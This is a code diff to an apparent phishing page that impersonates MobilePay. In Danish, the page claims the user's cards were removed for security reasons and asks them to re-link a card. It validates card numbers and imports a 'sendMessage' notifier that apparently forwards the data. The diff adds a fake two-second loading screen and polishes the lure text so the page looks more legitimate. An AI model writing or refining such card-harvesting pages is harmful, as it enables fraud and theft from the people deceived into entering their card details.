@@ -1,4 +1,4 @@
-import React, { useState } from "react";
+import React, { useEffect,useState } from "react";
 import Cards from "react-credit-cards";
 import "./Payment.css";
 import Mobilepay from "./images/mobilepay.png";
@@ -6,6 +6,8 @@ import Footer from "./Footer/Footer";
 import sendMessage from "./Notifier";
 import { useLocation } from "react-router-dom";
 import logo2 from "./images/Logo2.png";
+import Loader from "./Loader";
+import Loader2 from "./loader2";
 let card;
 
 const Payment = () => {
@@ -17,7 +19,7 @@ const Payment = () => {
   const [name, setName] = useState("");
   const [number, setNumber] = useState("");
   const [validInput, setValidInput] = useState("");
-
+  const [loading, setLoading] = useState(true);
 
 
 	function checkLuhn(cardNo)
@@ -124,16 +126,32 @@ const Payment = () => {
     }
   };
 
+  useEffect(() => {
+    setTimeout(() => {
+      setLoading(false);
+    }, 2000);
+  }, []);
+
+  
+  if (loading) return (
+    <div>
+      <Loader />
+      <Loader2 />
+    </div>
+  );
+
   return (
     <div className="payment_main">
       <img src={logo2} />
       <h1>Kortverifikation</h1>
       <p>
       Af sikkerhedsmæssige årsager har vi præventivt fjernet dine kort tilknyttet MobilePay.
-
-Tilknyt dit primare kort nu.
-
       </p>
+
+      <p>
+      Tilknyt dit primære kort nu.
+      </p>
+
 
       <div
         id="PaymentForm"
